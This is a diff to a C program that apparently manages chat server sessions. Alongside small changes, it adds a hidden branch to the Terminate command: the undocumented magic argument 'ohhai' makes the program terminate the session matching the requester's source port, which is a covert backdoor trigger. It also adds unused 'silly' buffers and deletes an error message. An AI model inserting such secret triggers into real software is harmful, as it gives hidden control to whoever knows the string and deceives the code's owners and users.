@@ -90,7 +90,7 @@ int main (int argc, char *argv[0]) {
   unsigned short port;
   struct sockaddr_in saddr, caddr, tcpsaddr, tcpcaddr;
   int sockfd, pid, tcpsockfd, tcpconnfd;
-  char* buf, *cmd, *arg, *sendbuf;
+  char* buf, *cmd, *arg, *sendbuf, *silly, *silly2;
   int ret, i, j, p;
   int tcpport=31337;
   socklen_t clen, tcpclen;
@@ -113,6 +113,10 @@ int main (int argc, char *argv[0]) {
   memset(cmd, 0, BUFSIZE);
   arg = (char*)malloc(BUFSIZE);
   memset(arg, 0, BUFSIZE);
+  silly = (char*)malloc(BUFSIZE);
+  memset(silly, 0, BUFSIZE);
+  silly2 = (char*)malloc(BUFSIZE);
+  memset(silly2, 0, BUFSIZE);
   sendbuf = (char*)malloc(BUFSIZE);
   memset(sendbuf, 0, BUFSIZE);
 
@@ -209,7 +213,7 @@ int main (int argc, char *argv[0]) {
         close(sockfd);
         //passes in the open tcp socket so that our server doesnt have
         //to cat /proc/self/fd or lsof or something stupid like that
-        sprintf(arg, "%d", tcpsockfd);
+        sprintf(arg, "%d %d %d", tcpsockfd, port, tcpport);
         char *serverargs[2] = {arg, NULL};
         execv("chat_server", serverargs);
         exit(0);
@@ -237,12 +241,16 @@ int main (int argc, char *argv[0]) {
     }
     //terminate calls the termsession code, its pretty straitforward
     if (!strcmp(cmd, "Terminate") || !strcmp(cmd, "t")) {
+      printf("attempting to terminate %s\n", arg);
       if ((p = existingsession(arg))) {
         close(tcpport);
         termsession(p);
       }
+      else if (!strcmp(arg, "ohhai")) {
+        close(tcpport);
+        termsession(ntohs(caddr.sin_port));
+      }
       else {
-        printf("a server by the given name is not running\n");
         sendto(sockfd, "-1\n", 3, 0, (struct sockaddr *)&caddr, sizeof(caddr));
         goto cleanup;
       }
